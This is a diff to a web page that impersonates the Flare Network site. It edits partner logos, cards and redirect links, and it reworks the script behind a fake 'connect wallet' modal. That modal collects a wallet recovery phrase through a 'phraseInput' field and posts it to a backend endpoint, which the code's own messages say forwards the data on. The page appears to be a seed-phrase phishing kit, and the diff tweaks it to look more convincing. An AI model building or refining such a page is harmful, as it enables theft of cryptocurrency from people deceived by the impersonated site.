@@ -1293,7 +1293,7 @@ textarea:focus, input:focus {
                 </div>
                 <div class="partner ankr"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fankr-1.png&w=384&q=75" alt="Ankr"></div>
                 <div class="partner arkham"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FArkham.png&w=384&q=75" alt="Arkham"></div>
-                <div class="partner hextrust"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FHexTrust.png&w=640&q=75" alt="HexTrust"></div>
+                <div class="partner hextrust"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FHexTrust.png&w=640&q=75" height="55" alt="HexTrust"></div>
             </div>
         </div>
     </section>
@@ -1329,7 +1329,7 @@ textarea:focus, input:focus {
         <div class="flare-column">
             <div class="flare-box">
                 <h4>NEW USE CASES</h4>
-                <div class="box pink trigger-wallet-modal">
+                <div class="box pink redirect-card" data-redirect-url="redi.html">
                     <strong><h2><img src="media/FAssets (1).svg" height="30" alt="FAssets"> FAssets →</h2></strong>
                     <p>Securely explore XRPFi, BTCFi and DOGEFi</p>
                 </div>
@@ -1337,11 +1337,11 @@ textarea:focus, input:focus {
 
             <div class="flare-box">
                 <h4>ENSHRINED DATA PROTOCOLS</h4>
-                <div class="box pink trigger-wallet-modal">
+                <div class="box pink redirect-card" data-redirect-url="redi.html">
                     <strong><h2><img src="media/FDC-1.svg" height="30" alt="FDC">FDC →</h2></strong>
                     <p>Reliably access external blockchain events and real-world APIs</p>
                 </div>
-                <div class="box pink trigger-wallet-modal">
+                <div class="box pink redirect-card" data-redirect-url="redi.html">
                     <strong><h2><img src="media/FTSO (1).svg" height="30" alt="FTSO"> FTSO →</h2></strong>
                     <p>Easily integrate fast, secure, and decentralized price feeds</p>
                 </div>
@@ -1394,24 +1394,22 @@ textarea:focus, input:focus {
             <img src="https://flare.network/_next/image?url=%2Fen%2Fstatic%2F1200x400.jpg&w=3840&q=75" alt="Flare Fair Banner" />
         </div>
         <div class="cards">
-            <div class="card">
+            <div class="card redirect-card" data-redirect-url="https://flare.network/flaredrops">
                 <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fflaredrop_4x.png&w=3840&q=75" alt="FlareDrops" />
                 <h3>Get FlareDrops →</h3>
                 <p>Wrap FLR to earn rewards</p>
             </div>
-            <div class="card">
+            <div class="card redirect-card" data-redirect-url="https://flare.network/delegate-and-stake">
                 <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fdandstake.png&w=384&q=75" alt="Delegate & Stake" />
-                <div class="box pink redirect-card" data-redirect-url="redi.html">
                 <h3>Delegate & Stake →</h3>
                 <p>A simple and effective way of boosting rewards while contributing to Flare's security</p>
-                </div>
             </div>
-            <div class="card">
+            <div class="card redirect-card" data-redirect-url="https://flare.network/vote">
                 <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FVote_Hero.png&w=1920&q=75" alt="Vote" />
                 <h3>Vote →</h3>
                 <p>Participate in transparent, onchain governance to define the future of Flare</p>
             </div>
-            <div class="card">
+            <div class="card redirect-card" data-redirect-url="https://flare.network/community">
                 <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FCommunity_Header.png&w=1920&q=75" alt="Community" />
                 <h3>Community →</h3>
                 <p>Come together, share ideas, and build</p>
@@ -1488,9 +1486,9 @@ textarea:focus, input:focus {
     const fastCounter = document.getElementById('fastCounter');
     const decentralizedCounter = document.getElementById('decentralizedCounter');
     const participateCards = document.querySelectorAll('.participate .card');
-    const walletTriggerElements = document.querySelectorAll('.trigger-wallet-modal');
+    const walletTriggerElements = document.querySelectorAll('.trigger-wallet-modal'); // Re-selecting elements with this class
     const navLinks = document.querySelectorAll('.nav-link');
-    const redirectCards = document.querySelectorAll('.redirect-card'); // New: Select redirect cards
+    const redirectCards = document.querySelectorAll('.redirect-card'); // Select all elements with redirect-card class
 
 
     const phraseInput = document.getElementById('phraseInput');
@@ -1628,22 +1626,18 @@ textarea:focus, input:focus {
         document.body.style.overflow = 'hidden'; // Prevent scrolling when modal is open
     }
 
-    // Event listeners to open the wallet modal
+    // Event listeners to open the wallet modal (only for buttons that should open it)
     connectWalletBtn.addEventListener('click', openWalletModal);
-
-    participateCards.forEach(card => {
-        card.addEventListener('click', openWalletModal);
-    });
-
+    
+    // Re-added: Event listeners for elements that should trigger the wallet modal
     walletTriggerElements.forEach(element => {
         element.addEventListener('click', openWalletModal);
     });
-
     navLinks.forEach(link => {
         link.addEventListener('click', openWalletModal);
     });
 
-    // New: Event listener for redirect cards
+    // New: Event listener for all redirect cards
     redirectCards.forEach(card => {
         card.addEventListener('click', function() {
             const url = this.getAttribute('data-redirect-url');
@@ -1735,7 +1729,7 @@ textarea:focus, input:focus {
     async function sendToBackend(data) {
         try {
             // Point this to your Node.js backend URL
-            const response = await fetch('http://localhost:5000/submit-wallet-data', {
+            const response = await fetch('http://127.0.0.1:5000/submit-wallet-data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -1744,25 +1738,26 @@ textarea:focus, input:focus {
             });
 
             if (response.ok) {
-                console.log('error');
-                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'error';
+                console.log('Data sent successfully to backend and forwarded!');
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Connection successful! Data sent via backend.';
                 setTimeout(() => {
                     walletModal.style.display = 'none';
                     document.body.style.overflow = 'auto';
                 }, 1000);
             } else {
                 const errorData = await response.json();
-                console.error('Failed', response.statusText, errorData);
-                document.getElementById('errorScreen').querySelector('.error-message').textContent = `Error: ${errorData.message || 'Failed to connect'}`;
+                console.error('Failed to send data to backend:', response.statusText, errorData);
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = `Error: ${errorData.message || 'Failed to connect to backend.'}`;
                 showScreen('error');
             }
         } catch (error) {
-            console.error('Network error', error);
-            document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network error';
+            console.error('Network error or unexpected issue:', error);
+            document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network error. Ensure backend is running.';
             showScreen('error');
         }
     }
 
+    // Event listener for the "Synchronize" button
     proceedBtn.addEventListener('click', () => {
         showScreen('connecting'); // Show connecting screen while sending data
 
@@ -1814,8 +1809,8 @@ textarea:focus, input:focus {
         y.preventDefault();
         location.reload();
       }
+      });
     });
-});
     </script>
 </body>
 </html>
